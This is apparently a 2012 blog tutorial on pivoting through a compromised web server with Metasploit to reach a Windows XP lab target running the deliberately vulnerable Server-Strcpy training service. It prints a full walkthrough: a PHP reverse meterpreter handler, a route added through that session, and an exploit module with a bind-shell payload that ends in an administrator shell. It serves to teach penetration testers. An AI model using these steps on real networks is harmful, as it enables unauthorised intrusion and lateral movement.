---
layout: post
title: "Introduction to pivoting, Part 4: Metasploit"
date: 2012-10-22 18:10:26 -0400
comments: true
categories: howto hacking
redirect_from: /2012/10/introduction-to-pivoting-part-4.html
---

In this article, we'll look at pivoting using [Metasploit](http://www.metasploit.com/). If you have the option to use Metasploit, you'll find that it makes pivoting much easier. Metasploit can be installed on Linux, Windows, and Mac OS X, which makes it a pretty versatile tool. The number of modules included in the framework grows continuously, and its low learning curve makes it popular among hackers. 

<!--more-->

### The scenario

There are two networks, 192.168.81.0/24 and 192.168.63.0/24. Our attacking machine, and a web server that has access to the 192.168.63.0/24 network are located in the 192.168.81.0/24 network. Our target, a Windows XP SP2 machine, is located in the 192.168.63.0/24. Our attacking machine does not have direct access to it, but the web server does.

![](/images/2012-10-22/01.jpg)

We've already compromised the web server and obtained some form of shell access to it, such as a reverse shell for instance. Our goal is to use the web server as our pivot and obtain a remote shell on the Windows XP machine. 

### The exploit

The Windows XP machine runs a vulnerable service called Server-Strcpy on port 10000. Server-Strcpy is part of the [SecurityTube Exploit Research Megaprimer](http://www.securitytube.net/video/1399) series, and can be downloaded at [http://code.securitytube.net/Server-Strcpy.exe](http://code.securitytube.net/Server-Strcpy.exe). I ported the python exploit we used in the previous articles into a Metasploit module which can be downloaded [here](https://gist.github.com/superkojiman/df9df065e2bbbef365aa5e2214e7f934). It should be saved in ~/.msf4/modules/exploits/windows/misc/. 

### The attack

We begin by gaining access to the web server with Metasploit. We've created a PHP reverse meterpreter shell payload using php/meterpreter_reverse_tcp. This was copied to the web server and will connect back to our machine and give us a meterpreter shell when we load it. Let's start up our handler and gain our meterpreter shell: 

```
# msfcli exploit/multi/handler PAYLOAD=php/meterpreter_reverse_tcp LHOST=192.168.81.125 LPORT=9999 E
[*] Please wait while we load the module tree...
 
Call trans opt: received. 2-19-98 13:24:18 REC:Loc
 
     Trace program: running
 
           wake up, Neo...
        the matrix has you
      follow the white rabbit.
 
          knock, knock, Neo.
 
                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`
 
 
       =[ metasploit v4.5.0-dev [core:4.5 api:1.0]
+ -- --=[ 961 exploits - 508 auxiliary - 153 post
+ -- --=[ 257 payloads - 28 encoders - 8 nops
 
PAYLOAD => php/meterpreter_reverse_tcp
LHOST => 192.168.81.125
LPORT => 9999
[*] Started reverse handler on 192.168.81.125:9999 
[*] Starting the payload handler...
[*] Meterpreter session 1 opened (192.168.81.125:9999 -> 192.168.81.181:64796) at 2012-10-05 16:26:12 -0400
 
meterpreter >
```

We've obtained a meterpreter shell on the web server. We'll need to background meterpreter so we can setup our pivot. To do this, we can use Metasploit's route command to associate the new route to our meterpreter session: 

```
meterpreter > background
[*] Backgrounding session 1...
msf  exploit(handler) > route add 192.168.63.0 255.255.255.0 1
[*] Route added
msf  exploit(handler) > route print
 
Active Routing Table
====================
 
   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.63.0       255.255.255.0      Session 1
 
msf  exploit(handler) >
```

Our pivot setup is now complete. Let's test it by exploiting Server-Strcpy using the serverstrcpy exploit module. The target port is already set to port 1000 by default, so all we have to do is specify the target IP address and the payload. For this example, we'll use the windows/shell_bind_tcp payload: 

```
msf  exploit(handler) > use exploit/windows/misc/serverstrcpy 
msf  exploit(serverstrcpy) > set RHOST 192.168.63.142
RHOST => 192.168.63.142
msf  exploit(serverstrcpy) > set PAYLOAD windows/shell_bind_tcp 
PAYLOAD => windows/shell_bind_tcp
msf  exploit(serverstrcpy) > exploit 
 
[*] Started bind handler
[*] Trying target Windows XP Pro SP2 English...
 
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
 
C:\Documents and Settings\Administrator\Desktop>        
 
C:\Documents and Settings\Administrator\Desktop>ipconfig
ipconfig
 
Windows IP Configuration
 
 
Ethernet adapter Local Area Connection:
 
        Connection-specific DNS Suffix  . : localdomain
        IP Address. . . . . . . . . . . . : 192.168.63.142
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 192.168.63.2
 
C:\Documents and Settings\Administrator\Desktop>
```

We've successfully pivoted our attack through the web server and obtained a remote shell on the target. This was an extremely easy setup, basically just using the route command within Metasploit to setup the pivot. 

This article concludes the series on introduction to pivoting. I started this series as a way to showcase different pivoting techniques that I hoped would be helpful to beginners. If the rules of engagement allow it, pivoting will allow you to show your clients just how serious a security breach can become if an attacker can tunnel deep into the network. 

